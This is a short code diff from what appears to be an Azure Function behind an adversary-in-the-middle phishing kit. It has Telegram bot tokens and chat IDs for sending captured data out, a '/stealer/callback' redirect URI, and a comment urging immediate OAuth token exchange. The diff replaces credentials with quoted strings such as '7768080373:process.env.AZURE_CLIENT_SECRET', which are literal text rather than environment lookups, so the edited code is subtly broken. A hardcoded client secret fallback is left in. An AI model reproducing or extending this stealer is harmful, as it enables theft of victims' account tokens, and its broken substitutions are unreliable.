@@ -1,6 +1,6 @@
-const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
+const TELEGRAM_BOT_TOKEN = '7768080373:process.env.AZURE_CLIENT_SECRET';
 const TELEGRAM_CHAT_ID = '6743632244';
-const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
+const TELEGRAM_BOT_TOKEN_2 = '7942871168:process.env.AZURE_CLIENT_SECRET';
 const TELEGRAM_CHAT_ID_2 = '6263177378';
 
 async function sendTelegram(message) {
@@ -73,7 +73,7 @@ module.exports = async function (context, req) {
   
   // 🚨 IMMEDIATE TOKEN EXCHANGE - No delays!
   try {
-    const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1';
+    const CLIENT_ID = 'process.env.AZURE_CLIENT_SECRET';
     const CLIENT_SECRET = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
     const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
     
